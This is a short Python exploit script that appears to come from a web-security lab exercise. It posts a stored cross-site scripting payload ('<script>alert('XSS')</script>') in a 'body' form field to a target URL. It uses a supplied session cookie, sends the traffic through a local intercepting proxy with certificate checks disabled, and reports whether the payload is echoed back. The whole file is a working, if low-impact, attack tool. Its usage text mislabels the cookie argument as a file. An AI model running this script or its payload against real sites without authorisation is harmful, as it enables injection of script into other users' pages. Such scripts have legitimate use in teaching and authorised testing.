import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit(url, cookie):
    cookies = {"PHPSESSID": cookie}
    payload = "<script>alert('XSS')</script>"

    data = {"body": payload}
    r = requests.post(url,  proxies=proxies, data=data,
                      verify=False,  cookies=cookies)
    print(r.content.decode())

    if payload in r.content.decode():
        sys.stdout.write("\n")
        sys.stdout.write("\t[+] XSS Alert Found ")
        sys.exit()
    sys.stdout.flush()
    sys.stdout.write('\n')
    sys.stdout.write('\t XSS failed')
    sys.stdout.write('\n')


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        cookie = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <URL> <FILE>" % sys.argv[0])
        print("[-] Example: %s www.example.com COOKIE" % sys.argv[0])
        sys.exit(-1)
    exploit(url, cookie)
